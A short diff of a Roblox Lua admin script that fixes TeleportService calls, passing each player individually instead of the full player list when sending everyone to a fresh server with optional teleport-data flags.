@@ -9,13 +9,13 @@ for i,v in pairs(game.Players:GetPlayers()) do
             m.Text = "cxo: You are being teleported to a new fresh server."
             
             if data.TeleportData.cxo then
-                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {cxo = true})
+                game:GetService("TeleportService"):Teleport(game.PlaceId, v, {cxo = true})
             elseif data.TeleportData.dizzy then
-                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {dizzy = true})
+                game:GetService("TeleportService"):Teleport(game.PlaceId, v, {dizzy = true})
             elseif data.TeleportData.punchy then
-                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers(), {punchy = true})
+                game:GetService("TeleportService"):Teleport(game.PlaceId, v, {punchy = true})
             else
-                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players:GetPlayers())
+                game:GetService("TeleportService"):Teleport(game.PlaceId, v)
             end
 
         else -- this part loads our admin back after the server is fresh
